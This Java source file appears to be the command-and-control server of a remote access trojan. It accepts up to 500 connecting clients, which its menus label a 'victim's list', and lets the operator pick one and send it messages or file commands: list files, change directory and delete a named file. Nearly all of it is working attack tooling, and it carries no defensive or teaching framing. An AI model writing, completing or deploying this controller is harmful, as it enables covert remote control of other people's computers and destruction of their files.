import java.net.ServerSocket;
import java.net.Socket;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.util.Scanner;

import org.graalvm.compiler.nodes.memory.MemoryCheckpoint.Multi;


class MultipleClients extends Thread {
    public boolean flag;
    public static int clientLimit = 500;
    public static Socket socket[] = new Socket[clientLimit];
    public static int clientCount = 0;
    public void run() {
        try{
            while(true) {
                socket[clientCount] = Server.serverSocket.accept();
                flag=true;
                if(clientCount>0){
                    for(int i=0; i<clientCount; i++){
                        if(socket[i].getInetAddress().toString().equals(socket[clientCount].getInetAddress().toString())) {
                            if(socket[i].getReuseAddress() == false) {
                                flag = false;
                                break;
                            }
                        }
                    }

                    if(flag == true) {
                        System.out.println("///////////////////////////////////////////////////////////////////////////");
                        System.out.println(socket[clientCount]);
                        System.out.println("///////////////////////////////////////////////////////////////////////////");
                        socket[clientCount].setReuseAddress(false);
                        MessageReceiver mr = new MessageReceiver(socket[clientCount], clientCount);
                        mr.start();
                        clientCount++;
                    }
                }
                else {
                    System.out.println("///////////////////////////////////////////////////////////////////////////");
                    System.out.println(socket[clientCount]);
                    System.out.println("///////////////////////////////////////////////////////////////////////////");
                    socket[clientCount].setReuseAddress(false);
                    MessageReceiver mr = new MessageReceiver(socket[clientCount], clientCount);
                    mr.start();
                    clientCount++;
                }
            }
        }
        catch(Exception e) {
            System.out.println(e);
        }
    }
}


class MessageReceiver extends Thread {
    String message;
    DataInputStream dis;
    Socket socket;
    int no;

    public MessageReceiver(Socket s, int n) {
        socket = s;
        no = n;
    }
    
    public void run() {
        try {
            dis = new DataInputStream(socket.getInputStream());
            while(true) {
                message = dis.readUTF();
                System.out.println(socket+" "+message);
            }
        }
        catch(Exception e) {
            try {
                MultipleClients.socket[no].setReuseAddress(true);
                socket.setReuseAddress(true);
            }
            catch(Exception ee) {
                
            }
        }
    }
}

class MessageSender extends Thread {
    int id;
    Scanner read;
    String message;
    DataOutputStream dos;

    public void run(){
        try {
            read = new Scanner(System.in);
            while(true) {
                message = read.nextLine();
                switch(message) {
                    case "/send":
                        System.out.println("\n\nDisplaying victim's list\n\n");
                        System.out.println("ID\tServer");
                        for(int i=0; i<MultipleClients.clientCount; i++) {
                            if(MultipleClients.socket[i].getReuseAddress() == false) {
                                System.out.println(i+"\t"+MultipleClients.socket[i]);
                            }
                        }
                        System.out.print("\n\nEnter Id: ");
                        message = read.nextLine();
                        id = Integer.parseInt(message);
                        if(id < MultipleClients.clientCount) {
                            if(MultipleClients.socket[id].getReuseAddress() == false) {
                                dos = new DataOutputStream(MultipleClients.socket[id].getOutputStream());
                                System.out.println("Connected. Start Chatting. /stop to disconnect");
                                while(true) {
                                    message = read.nextLine();
                                    if(!message.equals("/stop")) {
                                        if(MultipleClients.socket[id].getReuseAddress() == false) {
                                            dos.writeUTF("sendMsg()");
                                            dos.writeUTF(message);
                                        }
                                        else {
                                            System.out.println("System is not able to send message\n");
                                            break;
                                        }
                                    }
                                    else {
                                        System.out.println("\n\nDisconnected\n");
                                        break;
                                    }
                                }
                            }
                            else {
                                System.out.println("Id not found try again later\n");
                                break;
                            }
                        }
                        else{
                            System.out.println("Id not found try again later\n");
                        }
                        break;
                        
                        /*        Handling Users        */

                        case "/file_handler":
                        System.out.println("\n\nDisplaying victim's List \n\n");
                        System.out.println("ID\tServer");
                        for(int i=0; i<MultipleClients.clientCount; i++) {
                            if(MultipleClients.socket[i].getReuseAddress() == false) {
                                System.out.println(i+"\t"+MultipleClients.socket[i]);
                            }
                        }

                        System.out.print("\n\nEnter ID: ");
                        message = read.nextLine();
                        id = Integer.parseInt(message);

                        if(id<MultipleClients.clientCount) {
                            if(MultipleClients.socket[id].getReuseAddress() == false) {
                                dos = new DataOutputStream(MultipleClients.socket[id].getOutputStream());
                                System.out.println("Connected. Start chatting./stop to disconnect");
                                
                                while(true) {
                                    message = read.nextLine();
                                    if(message.equals("ls")) {
                                        if(MultipleClients.socket[id].getReuseAddress() == false) {
                                            dos.writeUTF("fileListing()");
                                        }
                                        else {
                                            System.out.println("System is not able to send a message.");
                                        }
                                    }
                                    else if(message.equals("cd")){
                                        if(MultipleClients.socket[id].getReuseAddress() == false) {
                                            dos.writeUTF("changeDir()");
                                            System.out.print("Enter the dir name: ");
                                            message = read.nextLine();
                                            dos.writeUTF(message);
                                        }
                                        else{
                                            System.out.println("System is not able to send a message.");
                                        }
                                    }
                                    else if(message.equals("rm")) {
                                        if(MultipleClients.socket[id].getReuseAddress() == false){
                                            dos.writeUTF("remove()");
                                            System.out.print("Enter the file name: ");
                                            message = read.nextLine();
                                            dos.writeUTF(message);
                                        }
                                        else {
                                            System.out.println("System is not able to send a message.");
                                        }
                                    }
                                    else if(message.equals("/stop")) {
                                        System.out.println("\n\n Disconnected\n\n");
                                        break;
                                    }
                                }
                            }
                            else{
                                System.out.println("Id not found try again later.");
                                break;
                            }
                        }
                        else {
                            System.out.println("Id not found try again later.");
                        }
                        break;

                        /*
                            Exiting Application
                        */
                        case "/exit":
                            System.out.print("Closing all connection.....");
                            if(MultipleClients.clientCount>0){
                                for(int i=0; i<MultipleClients.clientCount; i++) {
                                    MultipleClients.socket[i].close();
                                }
                            }
                            System.out.println("done");
                            System.out.print("Exiting from application....");
                            System.out.println("done");
                            Server.serverSocket.close();
                            System.exit(0);
                }
            }
        }
        catch(Exception e) {
        }
    }
}

class Server {
    public static ServerSocket serverSocket;
    public Server() throws Exception {
        serverSocket = new ServerSocket(3456);
        MultipleClients multipleClients = new MultipleClients();
        multipleClients.start();
        MessageSender sender = new MessageSender();
        sender.start();
    }

    public static void main(String args[]) throws Exception {
        Server s = new Server();
    }
}